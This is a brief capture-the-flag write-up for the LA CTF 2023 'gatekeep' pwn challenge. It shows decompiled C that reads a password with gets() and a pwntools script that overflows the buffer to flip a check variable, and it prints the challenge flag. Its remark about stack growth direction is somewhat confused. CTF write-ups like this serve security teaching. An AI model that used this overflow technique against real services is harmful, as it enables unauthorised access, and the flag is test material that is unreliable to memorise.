# gatekeep

[Problem](https://github.com/uclaacm/lactf-archive/tree/master/2023/pwn/gatekeep)

The main function is just calling "check", so I'll just show the function "check".

```c
int check()
{
  int result; // eax
  char buf[10]; // [rsp+7h] [rbp-29h] BYREF
  char s1[15]; // [rsp+11h] [rbp-1Fh] BYREF
  ssize_t v3; // [rsp+20h] [rbp-10h]
  int fd; // [rsp+28h] [rbp-8h]
  int v5; // [rsp+2Ch] [rbp-4h]

  v5 = 0;
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    puts("Can't access /dev/urandom.");
    exit(1);
  }
  v3 = read(fd, buf, 10uLL);
  if ( v3 < 0 )
  {
    puts("Data not received from /dev/urandom");
    exit(1);
  }
  close(fd);
  puts("Password:");
  gets(s1);
  result = strcmp(s1, buf);
  if ( result )
    result = puts("I swore that was the right password ...");
  else
    v5 = 1;
  if ( v5 )
  {
    puts("Guess I couldn't gaslight you!");
    result = print_flag();
  }
  return result;
}
```

I guess there's nothing much to say, it uses "gets". I was trying to overflow the bytes from "s1" to "buf", so thay can be the same. Well, I was thinking too complicated. We can just simply overflow the bytes to v5, then we can enter the if statement.

There's one more thing. If we check the stack of function "check", we will find that "s1" is below "buf", so it can't overflow to it. Since the stack extends from high address to low address, we can only overflow from buf with higher address to buf with lower address.

```python
from pwn import *
p=remote("lac.tf",31121)
payload=b'a'*0x1f
p.sendlineafter("Password:",payload)
print(p.recvall(timeout=0.5))
```

## Flag
> lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}